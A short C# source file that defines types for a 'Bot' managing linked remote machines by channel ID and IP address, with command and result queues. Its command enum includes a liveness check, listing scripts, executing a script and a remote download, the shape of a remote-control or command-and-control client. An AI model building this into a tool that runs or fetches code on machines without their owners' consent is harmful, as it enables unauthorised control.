using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Net;

namespace Link_Master.Worker
{
    internal static partial class Bot
    {
        internal static ConcurrentDictionary<UInt64, Machine> ActiveMachineLinks = new();

        internal class Machine
        {
            internal Machine(UInt64 channelID, IPAddress iPAddress, ref xVersion version)
            {
                ChannelID = channelID;
                Address = iPAddress;
                Version = version;

                WaiterThreadCount = 0;

                CommandQueue = new();
                ResultsQueue = new();
            }

            internal readonly UInt64 ChannelID;
            internal readonly IPAddress Address;
            internal readonly xVersion Version;

            internal UInt16 WaiterThreadCount;

            internal readonly Queue<Command> CommandQueue;
            internal readonly Object CommandQueue_Lock = new();

            internal readonly Queue<Result> ResultsQueue;
            internal readonly Object ResultsQueue_Lock = new();
        }

        internal struct Result
        {
            internal Result(Byte id, ref Byte[] result)
            {
                ID = id;
                ResultData = result;
            }

            internal readonly Byte ID;
            internal Byte[] ResultData;
        }

        internal readonly struct Command
        {
            internal Command(Byte id, CommandAction action, Byte[] data)
            {
                ID = id;
                CommandAction = action;
                Data = data;
            }

            internal readonly Byte ID;
            internal readonly CommandAction CommandAction;
            internal readonly Byte[] Data;
        }

        internal enum CommandAction : Byte
        {
            UAliveQuestionMark = 0x01,
            YuesAmIAlive = 0x02,

            EnumScripts = 0x03,
            ExecuteScript = 0x04,
            RemoteDownload = 0x05
        }
    }
}